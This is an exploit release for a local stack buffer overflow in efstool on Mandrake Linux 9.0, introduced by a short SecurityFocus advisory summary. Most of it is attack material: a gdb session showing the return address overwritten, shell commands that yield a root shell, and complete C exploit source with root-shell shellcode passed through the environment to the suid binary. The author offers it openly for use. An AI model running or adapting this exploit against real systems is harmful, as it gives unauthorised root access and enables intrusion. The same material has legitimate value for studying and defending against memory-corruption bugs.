source: http://www.securityfocus.com/bid/5125/info
  
Bonobo is a set of tools and CORBA interfaces included as part of the Gnome infrastructure. It is designed for use on the Linux and Unix operating systems.
  
A boundry condition error has been discovered in the efstool program. Due to improper bounds checking, it is possible for a user to supply a long commandline argument to the efstool program, which would result in a buffer overflow. This problem could be exploited on the local system to overwrite stack memory, including the return address, and execute attacker supplied code. 

/*
    Author: N4rK07IX
    narkotix@linuxmail.org || kayaem@itu.edu.tr (i think this is useless pop3 box,never checked, inbox is out of memory)

**Vulnerablity: The vulnerablity is OLD and out of date.Mandrake Linux 9.0 "efstool"  libefs1-1.0.20-4mdk  local stack overflow.

[narkotix@labs c-hell]$ efstool `perl -e 'print "A"x2688'`
Segmentation fault
[narkotix@labs c-hell]$
gdb) r `perl -e 'print "A"x2688'`
Starting program: /usr/bin/efstool `perl -e 'print "A"x2688'`
no debugging symbols found)...(no debugging symbols found)...
no debugging symbols found)...(no debugging symbols found)...
no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info r
eax            0xa      10ecx            0xa      10
edx            0x4f4c4554       1330398548
ebx            0x41414141       1094795585
esp            0xbfffe780       0xbfffe780
ebp            0x41414141       0x41414141
esi            0x41414141       1094795585
edi            0x41414141       1094795585
eip            0x41414141       0x41414141
eflags         0x210286 2163334
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0

[narkotix@labs c-hell]$ ./env  <----- This put sh3llc0de with padding 0x90 s to the environment
[narkotix@labs c-hell]$ efstool `perl -e 'print "\x1c\xfd\xff\xbf" x 672'`
sh-2.05b# id
uid=0(root) gid=0(root) groups=501(narkotix)
sh-2.05b#
Exploited on Mandrake Linux 9.0 in 2003<--- old history :p
efstool must be suid to  get an uid(0), but i saw on many systemz it is not suided ,on my system  it is.
May be when i was asleep my mom had gonna suided it :P

[narkotix@labs c-hell]$ make efs_n4
cc     efs_n4.c   -o efs_n4
[narkotix@labs c-hell]$ ./efs_n4
sh-2.05b# id
uid=0(root) gid=0(root) groups=501(narkotix)
sh-2.05b#

Scriptkiddi3Z im sorry , this is not an 0Hday ;
Efstool bug is out of fassion.I 've forgetten to release this shit a year ago ,
but today i  found it on my toolz directory.N0w it is fr33...

Greetz: EFnet , laplace_ex , math_monkey,deathmann,ISLAM Nation,EnderUNIX team(Turk BSD crew)
Shoutz: Hi bigmutant , is da default configregister 0x2102 on your cisco1700 ??

Last Words: laplace_ex, bi tane dersi drop etmem lazim Cuma gunu hydraulics labaratuvarinda bekliyorum
            Motorola 68000 kitabin da ben de kaldi onu da getiririm ---> Haftaya duello var:P
*/



#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define BUFFERSIZE 2688

static char hell_code[] = //52 bytes sh3llc0de

        //* setreuid(0,0);
        "\x31\xc0"                      // xor    %eax,%eax
        "\x31\xdb"                      // xor    %ebx,%ebx
        "\x31\xc9"                      // xor    %ecx,%ecx
        "\xb0\x46"                      // mov    $0x46,%al
        "\xcd\x80"                      // int    $0x80

        /* setgid(0); */
        "\x31\xdb"                      // xor %ebx,%ebx
        "\x89\xd8"                      // mov %ebx,%eax
        "\xb0\x2e"                      // mov $0x2e,%al
        "\xcd\x80"                      // int $0x80

        // execve /bin/sh
        "\x31\xc0"                      // xor    %eax,%eax
        "\x50"                          // push   %eax
        "\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
        "\x89\xe3"                      // mov    %esp,%ebx
        "\x8d\x54\x24\x08"              // lea    0x8(%esp,1),%edx
        "\x50"                          // push   %eax
        "\x53"                          // push   %ebx
        "\x8d\x0c\x24"                  // lea    (%esp,1),%ecx
        "\xb0\x0b"                      // mov    $0xb,%al
        "\xcd\x80"                      // int    $0x80

        // exit();
        "\x31\xc0"                      // xor    %eax,%eax
        "\xb0\x01"                      // mov    $0x1,%al
        "\xcd\x80";                     // int    $0x80


main(void) //Th3 l3ss c0d3,th3 b3st performance..
{       printf("Mandrake Linux 9.0 efstool local xploit written by N4rK07IX\n");
        printf("=> narkotix@linuxmail.org\n");
        char *env[2] = {hell_code, NULL};
        char buffer[BUFFERSIZE];

        int i;
        int *lamepointer = (int *)(buffer );

        int ret_addr = 0xbffffffa - strlen(hell_code) - strlen("/usr/bin/efstool");


        for (i = 0; i < BUFFERSIZE-1 ; i += 4)
                *lamepointer++ = ret_addr;

        execle("/usr/bin/efstool", "efstool", buffer, NULL,env);
        if(!execle)
        perror("execle()");
        return(0);
}

